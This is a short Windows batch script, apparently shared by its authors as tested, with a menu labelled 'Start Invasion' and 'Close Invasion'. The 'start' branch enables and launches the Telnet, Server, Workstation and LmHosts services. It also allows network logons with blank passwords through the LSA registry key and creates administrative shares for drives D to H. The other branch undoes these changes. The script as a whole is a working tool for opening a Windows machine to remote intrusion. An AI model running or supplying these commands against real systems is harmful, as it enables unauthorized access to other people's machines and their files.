::这个是自己和一个朋友写的，测试成功
@echo off 
color 0a
echo.
set /p a=Choose 1:Start  Invasion  2:Close  Invasion
if %a%==1 (goto a ) else (goto b)
goto :eof
:a
@echo off 
sc config lanmanserver start= auto
sc start lanmanserver||net stop lanmanserver&net start lanmanserver
echo.

sc config lanmanworkstation start= auto
sc start lanmanworkstation||net stop lanmanworkstation&net start lanmanworkstation
echo.

sc config tlntsvr start= auto
sc start tlntsvr||net stop tlntsvr&net start tlntsvr
echo.

sc config LmHosts start= auto
sc start LmHosts||net stop LmHosts&net start LmHosts
echo.


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000000 /F>nul 2>nul&reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000000 /F>nul 2>nul

net share d$
net share e$
net share f$
net share g$
net share h$
pause
exit
:b
net share d$ /delete
net share e$ /delete
net share f$ /delete
net share g$ /delete
net share h$ /delete

sc config lanmanserver start= disabled
sc stop lanmanserver

sc config lanmanworkstation start= disabled
sc stop lanmanworkstation

sc config LmHosts start=disabled
sc stop LmHosts

sc config tlntsvr start= disabled
sc stop tlntsvr

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000001 /F
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000001 /F
